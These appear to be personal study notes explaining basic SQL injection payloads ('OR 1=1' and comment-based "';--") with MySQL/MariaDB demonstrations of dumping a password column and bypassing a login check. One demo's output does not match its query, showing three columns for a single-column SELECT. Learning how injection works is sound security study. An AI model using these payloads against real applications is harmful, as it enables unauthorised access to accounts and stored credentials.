
---

#### Key Queries to Use

>[!failure] **Query #1**
> 
> ```sql
> OR 1=1
> ```

>[!summary]- How to use
> This query segment will bypass the conditions in the running queries.
> For example;
> ```sql
> MariaDB [Sample]> Select user_password from Login 
>		-> where User_name="admin";
> +---------------+
> | user_password |
> +---------------+
> | admin         |
> +---------------+
> 1 row in set (0.000 sec)
> ```
> 
> By adding `OR 1=1`, the `WHERE` statement will be bypassed and all entries in the column specified in `SELECT` statement will be selected. 
> If  `SELECT *` is used, then all data in the table will be selected.
> 
> ```sql
> MariaDB [Sample]> Select user_password from Login 
>		-> where User_name="admin" 
>		-> OR 1=1;  --to bypass WHERE statement
> +---------+-----------+---------------+
> | User_ID | User_name | User_password |
> +---------+-----------+---------------+
> |       1 | admin     | admin         |
> |       2 | daniel    | qwerty        |
> +---------+-----------+---------------+
> 2 rows in set (0.001 sec)
> ```
> 
> The final resulting query will be `SELECT user_password FROM Login`

---

>[!failure] **Query #2**
> 
>```sql
>';--
>";--
>``` 

>[!summary]- How to use
> ```sql
> SELECT COUNT(username) FROM Logins
> WHERE username='administrator' --' END OF QUERY
> AND password=''  --Commented Query
> ```
> Example Table
>```sql
> mysql> SELECT * FROM Login;
> +---------+-----------+-----------------+
> | User_ID | User_name | User_password   |
> +---------+-----------+-----------------+
> |       1 | michaelt  | password        |
> |       2 | franklinc | frankfrankfrank |
> |       3 | trevorp   | suckthis69      |
> +---------+-----------+-----------------+
> 
> mysql> SELECT COUNT(User_name) from Login WHERE User_name = "michaelt" and User_password = "password";
> +------------------+
> | COUNT(User_name) |
> +------------------+
> |                1 |
> +------------------+
> 1 row in set (0.00 sec)
> 
> mysql> SELECT COUNT(User_name) from Login WHERE User_name = "michaelt" AND User_password = "DadaAda"; -- <---no bypass segment
> +------------------+
> | COUNT(User_name) |
> +------------------+
> |                0 | 
> +------------------+
> 1 row in set (0.00 sec)
> 
> mysql> SELECT COUNT(User_name) from Login WHERE User_name = "michaelt";-- AND User_password = "DadaAda"; <--bypass segment inserted
> +------------------+
> | COUNT(User_name) |
> +------------------+
> |                1 |
> +------------------+
> 1 row in set (0.00 sec)
> 


---

